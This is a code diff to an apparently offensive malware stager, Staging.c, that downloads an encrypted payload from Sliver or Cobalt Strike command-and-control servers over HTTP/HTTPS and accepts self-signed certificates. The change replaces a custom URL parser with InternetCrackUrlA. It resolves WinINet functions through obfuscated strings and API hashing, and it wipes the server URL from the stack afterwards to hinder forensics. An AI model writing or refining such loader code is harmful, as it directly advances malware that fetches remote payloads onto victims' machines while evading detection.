@@ -1,6 +1,7 @@
 // =============================================
 // Staging.c - Download encrypted payload via HTTP/HTTPS
 // Handles self-signed certificates (Sliver/Cobalt Strike)
+// Uses InternetCrackUrlA for robust URL parsing
 // =============================================
 
 #include "Common.h"
@@ -25,6 +26,8 @@
 #define HTTP_QUERY_CONTENT_LENGTH       5
 #define HTTP_QUERY_STATUS_CODE          19
 #define HTTP_QUERY_FLAG_NUMBER          0x20000000
+#define INTERNET_SCHEME_HTTP            3
+#define INTERNET_SCHEME_HTTPS           4
 
 // WinINet typedefs
 typedef PVOID(WINAPI* fnInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
@@ -37,57 +40,26 @@ typedef BOOL (WINAPI* fnInternetSetOptionA)(PVOID, DWORD, LPVOID, DWORD);
 typedef BOOL (WINAPI* fnInternetQueryOptionA)(PVOID, DWORD, LPVOID, LPDWORD);
 typedef BOOL (WINAPI* fnHttpQueryInfoA)(PVOID, DWORD, LPVOID, LPDWORD, LPDWORD);
 
-// Simple URL parser
-static BOOL ParseUrl(
-    IN  LPCSTR szUrl,
-    OUT PCHAR  szHost,  IN DWORD dwHostLen,
-    OUT PCHAR  szPath,  IN DWORD dwPathLen,
-    OUT PWORD  pwPort,
-    OUT PBOOL  pbHttps
-) {
-    LPCSTR p = szUrl;
+// InternetCrackUrlA
+typedef struct _URL_COMPONENTSA_S {
+    DWORD   dwStructSize;
+    LPSTR   lpszScheme;
+    DWORD   dwSchemeLength;
+    DWORD   nScheme;
+    LPSTR   lpszHostName;
+    DWORD   dwHostNameLength;
+    WORD    nPort;
+    LPSTR   lpszUserName;
+    DWORD   dwUserNameLength;
+    LPSTR   lpszPassword;
+    DWORD   dwPasswordLength;
+    LPSTR   lpszUrlPath;
+    DWORD   dwUrlPathLength;
+    LPSTR   lpszExtraInfo;
+    DWORD   dwExtraInfoLength;
+} URL_COMPONENTSA_S;
 
-    // Scheme
-    if (p[0] == 'h' && p[1] == 't' && p[2] == 't' && p[3] == 'p') {
-        p += 4;
-        if (*p == 's') { *pbHttps = TRUE; p++; } else { *pbHttps = FALSE; }
-        if (*p == ':') p++;
-        if (*p == '/') p++;
-        if (*p == '/') p++;
-    } else {
-        return FALSE;
-    }
-
-    // Host (and optional port)
-    DWORD i = 0;
-    *pwPort = *pbHttps ? 443 : 80;
-    while (*p && *p != '/' && *p != ':' && i < dwHostLen - 1)
-        szHost[i++] = *p++;
-    szHost[i] = 0;
-
-    if (*p == ':') {
-        p++;
-        WORD port = 0;
-        while (*p >= '0' && *p <= '9') {
-            port = port * 10 + (*p - '0');
-            p++;
-        }
-        *pwPort = port;
-    }
-
-    // Path
-    i = 0;
-    if (*p == '/') {
-        while (*p && i < dwPathLen - 1)
-            szPath[i++] = *p++;
-    } else {
-        szPath[0] = '/';
-        i = 1;
-    }
-    szPath[i] = 0;
-
-    return TRUE;
-}
+typedef BOOL(WINAPI* fnInternetCrackUrlA)(LPCSTR lpszUrl, DWORD dwUrlLength, DWORD dwFlags, URL_COMPONENTSA_S* lpUrlComponents);
 
 BOOL DownloadPayload(
     IN  PAPI_HASHING pApi,
@@ -113,8 +85,10 @@ BOOL DownloadPayload(
     BYTE xA6[] = XSTR_INTERNET_CLOSE_HANDLE;
     BYTE xA7[] = XSTR_INTERNET_SET_OPTION_A;
     BYTE xA8[] = XSTR_INTERNET_QUERY_OPTION_A;
+    BYTE xA9[] = XSTR_INTERNET_CRACK_URL_A;
     DEOBF(xA1); DEOBF(xA2); DEOBF(xA3); DEOBF(xA4);
     DEOBF(xA5); DEOBF(xA6); DEOBF(xA7); DEOBF(xA8);
+    DEOBF(xA9);
 
     fnInternetOpenA      pInetOpen    = (fnInternetOpenA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA1);
     fnInternetConnectA   pInetConnect = (fnInternetConnectA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA2);
@@ -124,22 +98,32 @@ BOOL DownloadPayload(
     fnInternetCloseHandle pInetClose  = (fnInternetCloseHandle)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA6);
     fnInternetSetOptionA pInetSetOpt  = (fnInternetSetOptionA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA7);
     fnInternetQueryOptionA pInetQueryOpt = (fnInternetQueryOptionA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA8);
+    fnInternetCrackUrlA  pCrackUrl    = (fnInternetCrackUrlA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA9);
 
-    if (!pInetOpen || !pInetConnect || !pHttpOpen || !pHttpSend || !pInetRead || !pInetClose) {
+    if (!pInetOpen || !pInetConnect || !pHttpOpen || !pHttpSend || !pInetRead || !pInetClose || !pCrackUrl) {
         LOG("[!] Failed resolving WinINet");
         return FALSE;
     }
 
-    // Parse URL
+    // Parse URL using InternetCrackUrlA (handles all edge cases)
     CHAR szHost[256] = { 0 };
     CHAR szPath[512] = { 0 };
-    WORD wPort = 0;
-    BOOL bHttps = FALSE;
 
-    if (!ParseUrl(szUrl, szHost, 256, szPath, 512, &wPort, &bHttps)) {
-        LOG("[!] URL parse failed");
+    URL_COMPONENTSA_S uc;
+    MemSet(&uc, 0, sizeof(uc));
+    uc.dwStructSize     = sizeof(uc);
+    uc.lpszHostName     = szHost;
+    uc.dwHostNameLength = sizeof(szHost);
+    uc.lpszUrlPath      = szPath;
+    uc.dwUrlPathLength  = sizeof(szPath);
+
+    if (!pCrackUrl(szUrl, 0, 0, &uc)) {
+        LOG("[!] InternetCrackUrl failed");
         return FALSE;
     }
+
+    WORD wPort  = uc.nPort;
+    BOOL bHttps = (uc.nScheme == INTERNET_SCHEME_HTTPS);
 
     LOG("[*] Connecting...");
 
@@ -265,6 +249,10 @@ BOOL DownloadPayload(
     pInetClose(hRequest);
     pInetClose(hConnect);
     pInetClose(hInternet);
+
+    // Wipe sensitive URL data from stack
+    MemSet(szHost, 0, sizeof(szHost));
+    MemSet(szPath, 0, sizeof(szPath));
 
     if (sTotalSize == 0) {
         LOG("[!] Downloaded 0 bytes");
